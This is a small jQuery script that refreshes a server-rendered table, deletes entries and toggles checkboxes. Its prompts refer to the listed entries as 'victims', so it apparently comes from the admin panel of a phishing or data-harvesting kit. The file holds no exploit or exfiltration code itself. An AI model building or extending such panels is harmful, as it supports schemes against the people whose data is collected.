refresh_div()
// counter = check_new_users = 0;

// function checker() {
//     jQuery.ajax({
//         url: 'actions.php',
//         data: {
//             "checker": "checker",
//             "counter": counter
//         },
//         type: 'POST',
//         success: function (results) {
//             check_new_users = (results > counter) ? 1 : 0;
//             counter = results;
//         }
//     });
// }
// setInterval(checker, 1000);


function refresh_div() {
    jQuery.ajax({
        url: 'actions.php',
        data: {
            "show_table": "show_table"
        },
        type: 'POST',
        success: function (results) {
            jQuery(".result").html(results);
        }
    });
}

// function refresh_if_new() {
//     if (check_new_users == 1) {
//         refresh_div();
//     }
// }
// setInterval(refresh_if_new, 600);

function delete_user(user_identifier) {
    var action;
    if (confirm("Are you sure you want to delete victim?")) {
        $.ajax({
            url: "actions.php",
            type: "POST",
            data: {
                'action': "action",
                'user_identifier': user_identifier
            },
            success: function () {
                alert("The victim was deleted.");
                refresh_div()
            }
        });
    } else {
        return false;
    }
};

function toggle(source) {
    checkboxes = document.getElementsByName('user_ids[]');
    for (var i = 0, n = checkboxes.length; i < n; i++) {
        checkboxes[i].checked = source.checked;
    }
}